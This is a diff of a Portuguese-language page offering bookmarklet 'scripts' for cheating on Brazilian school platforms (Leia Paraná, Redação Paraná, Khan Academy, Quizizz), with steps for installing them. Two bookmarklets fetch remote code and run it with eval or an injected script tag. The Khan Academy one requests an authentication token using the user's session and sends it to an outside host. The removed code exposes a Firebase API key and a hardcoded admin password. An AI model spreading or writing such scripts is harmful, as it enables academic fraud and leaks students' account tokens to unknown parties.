@@ -13,133 +13,202 @@ body{
   color:#fff;
 }
 
-/* ESCONDE SITE */
-#siteContent{display:none;}
-
-/* LOGIN */
-#loginOverlay{
-  position:fixed;
-  top:0;left:0;
-  width:100%;height:100%;
-  background:#000;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  z-index:999999;
-}
-
-.loginBox{
-  background:#1a1a1a;
-  padding:30px;
-  border-radius:15px;
+/* HEADER */
+header{
   text-align:center;
-  width:300px;
+  padding:30px;
+  background:rgba(0,0,0,0.6);
 }
 
-.loginBox input,.loginBox button{
-  width:100%;
-  padding:10px;
-  margin-top:10px;
-  border:none;
-  border-radius:8px;
+header h1{
+  font-size:30px;
+  letter-spacing:3px;
 }
 
-.loginBox button{
-  background:#ff4d4d;
-  color:#fff;
-  cursor:pointer;
-}
-
-/* ADMIN */
-#adminPanel{
-  position:fixed;
-  top:50%;
-  left:50%;
-  transform:translate(-50%,-50%);
-  background:#111;
-  padding:25px;
-  border-radius:15px;
-  z-index:999999;
-  display:none;
-  width:320px;
-  box-shadow:0 0 20px rgba(255,0,0,0.4);
-}
-
-#adminPanel input,#adminPanel button{
-  width:100%;
-  padding:8px;
+header span{
+  display:block;
   margin-top:8px;
-  border:none;
-  border-radius:8px;
+  color:#ff4d4d;
+  font-size:14px;
+  opacity:0.8;
 }
 
-#adminPanel button{
+/* TUTORIAL */
+.tutorial{
+  margin:30px;
+  padding:20px;
+  background:rgba(255,0,0,0.08);
+  border:1px solid rgba(255,0,0,0.3);
+  border-radius:15px;
+  animation:fadeUp 1s ease;
+}
+
+.tutorial h2{
+  color:#ff4d4d;
+  margin-bottom:10px;
+}
+
+.tutorial p{
+  font-size:14px;
+  opacity:0.9;
+  margin-bottom:8px;
+}
+
+/* GRID */
+.container{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+  gap:25px;
+  padding:30px;
+}
+
+/* CARD */
+.card{
+  background:rgba(255,255,255,0.05);
+  border-radius:20px;
+  padding:20px;
+  transition:0.4s;
+  animation:fadeUp 0.8s ease;
+}
+
+.card:hover{
+  transform:translateY(-8px);
+  box-shadow:0 0 20px rgba(255,0,0,0.3);
+}
+
+.card h2{
+  color:#ff4d4d;
+  margin-bottom:10px;
+}
+
+.script-box{
+  background:#000;
+  padding:12px;
+  border-radius:10px;
+  font-size:12px;
+  overflow-x:auto;
+  margin-bottom:15px;
+}
+
+/* BOTÕES */
+.buttons{
+  display:flex;
+  gap:10px;
+}
+
+button,a{
+  flex:1;
+  padding:10px;
+  border:none;
+  border-radius:10px;
+  cursor:pointer;
+  text-align:center;
+  text-decoration:none;
+  font-weight:bold;
+}
+
+.copy{
   background:#ff4d4d;
   color:#fff;
-  cursor:pointer;
 }
 
-#adminPanel ul{
-  margin-top:10px;
-  max-height:120px;
-  overflow:auto;
-  font-size:12px;
+.access{
+  background:#fff;
+  color:#000;
 }
 
-/* SEU DESIGN */
-header{text-align:center;padding:30px;background:rgba(0,0,0,0.6);}
-header h1{font-size:30px;letter-spacing:3px;}
-header span{display:block;margin-top:8px;color:#ff4d4d;font-size:14px;opacity:0.8;}
+/* FOOTER */
+footer{
+  text-align:center;
+  padding:20px;
+  opacity:0.7;
+}
 
-.tutorial{margin:30px;padding:20px;background:rgba(255,0,0,0.08);border:1px solid rgba(255,0,0,0.3);border-radius:15px;}
-.container{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:25px;padding:30px;}
-.card{background:rgba(255,255,255,0.05);border-radius:20px;padding:20px;}
-.card h2{color:#ff4d4d;}
-.script-box{background:#000;padding:12px;border-radius:10px;font-size:12px;margin-bottom:15px;}
+.brand{
+  color:#ff4d4d;
+  margin-top:5px;
+}
 
-footer{text-align:center;padding:20px;opacity:0.7;}
-.brand{color:#ff4d4d;margin-top:5px;}
+/* ANIMAÇÃO */
+@keyframes fadeUp{
+  from{opacity:0;transform:translateY(20px);}
+  to{opacity:1;transform:translateY(0);}
+}
 </style>
 </head>
 
 <body>
-
-<!-- LOGIN -->
-<div id="loginOverlay">
-  <div class="loginBox">
-    <h2>Login</h2>
-    <input type="password" id="senha" placeholder="Digite a senha">
-    <button onclick="login()">Entrar</button>
-    <p id="msg"></p>
-  </div>
-</div>
-
-<!-- ADMIN -->
-<div id="adminPanel">
-  <h3>Painel Admin</h3>
-  <input id="novaSenha" placeholder="Nova senha">
-  <button onclick="criar()">Criar acesso</button>
-  <ul id="lista"></ul>
-</div>
-
-<!-- SITE -->
-<div id="siteContent">
 
 <header>
   <h1>100% PLATAFORMAS</h1>
   <span>feito por Pajé 01</span>
 </header>
 
+<!-- TUTORIAL -->
 <div class="tutorial">
-  <h2>📌 Área protegida</h2>
-  <p>Conteúdo liberado após login</p>
+  <h2>📌 Como usar scripts com favoritos</h2>
+
+  <p><b>1.</b> Clique em "Copiar Script".</p>
+  <p><b>2.</b> Crie um novo favorito no navegador (estrela ⭐).</p>
+  <p><b>3.</b> Edite o favorito:</p>
+  <p>→ Nome: escolha qualquer nome (ex: "Script1")</p>
+  <p>→ URL: cole o script copiado</p>
+
+  <p><b>4.</b> Salve o favorito.</p>
+
+  <p><b>5.</b> Para usar:</p>
+  <p>→ Abra o site desejado</p>
+  <p>→ Clique no favorito OU digite o nome na barra de busca</p>
+
+  <p>⚠️ Alguns navegadores podem bloquear scripts automaticamente.</p>
 </div>
 
 <div class="container">
-  <div class="card"><h2>Script 1</h2><div class="script-box">Conteúdo bloqueado</div></div>
-  <div class="card"><h2>Script 2</h2><div class="script-box">Conteúdo bloqueado</div></div>
-  <div class="card"><h2>Script 3</h2><div class="script-box">Conteúdo bloqueado</div></div>
-  <div class="card"><h2>Script 4</h2><div class="script-box">Conteúdo bloqueado</div></div>
+
+  <div class="card">
+    <h2>Leia Paraná</h2>
+    <div class="script-box" id="s1">
+javascript:(function(){fetch('https://cdn.jsdelivr.net/gh/mzzvxm/LeiaPRBypass@latest/script.js').then(r=>r.text()).then(eval);})();
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s1')">Copiar</button>
+      <a class="access" href="https://leiaparana.odilo.us/?locale=pt" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Redação Paraná</h2>
+    <div class="script-box" id="s2">
+javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mzzvxm/RedacaoBypass@main/script.js?t='+Date.now();document.head.appendChild(s)})();
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s2')">Copiar</button>
+      <a class="access" href="https://redacao.pr.gov.br/" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Khan Academy</h2>
+    <div class="script-box" id="s3">
+javascript:(async()=>{let e=window.location.hostname;if("khanacademy.org"!==e.split(".")?.slice(1)?.join("."))return;let a=e.split(".")[0];open(`https://khan.cupiditys.lol/?token=${(await (await fetch(`/api/internal/graphql/createTransferAuthTokenMutation?lang=${"www"===a?"en":a}&app=khanacademy`,{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\n    token\n    __typename\n  }\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"})).json()).data.createTransferAuthToken.token}&l=${a}&c=${window.__KA_DATA__["KA-fastly-country"]}`)})();
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s3')">Copiar</button>
+      <a class="access" href="https://www.khanacademy.org/" target="_blank">Acessar</a>
+    </div>
+  </div>
+
+  <div class="card">
+    <h2>Quizizz</h2>
+    <div class="script-box" id="s4">
+https://waygroundx.vercel.app/
+    </div>
+    <div class="buttons">
+      <button class="copy" onclick="copiar('s4')">Copiar</button>
+      <a class="access" href="https://waygroundx.vercel.app/" target="_blank">Acessar</a>
+    </div>
+  </div>
+
 </div>
 
 <footer>
@@ -147,118 +216,11 @@ footer{text-align:center;padding:20px;opacity:0.7;}
 <div class="brand">feito por Pajé 01</div>
 </footer>
 
-</div>
-
-<!-- FIREBASE COMPAT -->
-<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
-
 <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyAUaobe_8CWFMG2gnHXUsdVEPTVsvYyIPI",
-  authDomain: "plataformas-c1986.firebaseapp.com",
-  projectId: "plataformas-c1986"
-};
-
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
-
-let ip = "unknown";
-let device = navigator.userAgent;
-
-// pegar IP
-fetch("https://api64.ipify.org?format=json")
-.then(r=>r.json())
-.then(d=>ip=d.ip)
-.catch(()=>ip="offline");
-
-// LOGIN
-function login(){
-  let senha = document.getElementById("senha").value.trim();
-
-  if(!senha){
-    msg("Digite uma senha");
-    return;
-  }
-
-  // ADMIN
-  if(senha === "cavalo"){
-    liberar(true);
-    return;
-  }
-
-  let ref = db.collection("acessos").doc(senha);
-
-  ref.get().then(doc=>{
-
-    if(!doc.exists){
-      msg("Senha inválida");
-      return;
-    }
-
-    let data = doc.data();
-
-    // primeiro acesso
-    if(!data.ip){
-      ref.update({ ip: ip, device: device });
-      liberar(false);
-      return;
-    }
-
-    // verificação
-    if(data.ip !== ip || data.device !== device){
-      msg("Bloqueado nesse dispositivo");
-      return;
-    }
-
-    liberar(false);
-
-  }).catch(()=>{
-    msg("Erro ao conectar");
-  });
-}
-
-// LIBERAR
-function liberar(admin){
-  document.getElementById("loginOverlay").style.display="none";
-  document.getElementById("siteContent").style.display="block";
-
-  if(admin){
-    document.getElementById("adminPanel").style.display="block";
-    carregar();
-  }
-}
-
-// CRIAR
-function criar(){
-  let senha = document.getElementById("novaSenha").value.trim();
-  if(!senha) return;
-
-  db.collection("acessos").doc(senha).set({
-    ip:null,
-    device:null
-  });
-
-  carregar();
-}
-
-// LISTAR
-function carregar(){
-  let lista=document.getElementById("lista");
-  lista.innerHTML="";
-
-  db.collection("acessos").get().then(snap=>{
-    snap.forEach(d=>{
-      let li=document.createElement("li");
-      li.innerText=d.id+" | "+(d.data().ip||"novo");
-      lista.appendChild(li);
-    });
-  });
-}
-
-// MSG
-function msg(t){
-  document.getElementById("msg").innerText=t;
+function copiar(id){
+  const texto = document.getElementById(id).innerText;
+  navigator.clipboard.writeText(texto);
+  alert("Copiado!");
 }
 </script>
 
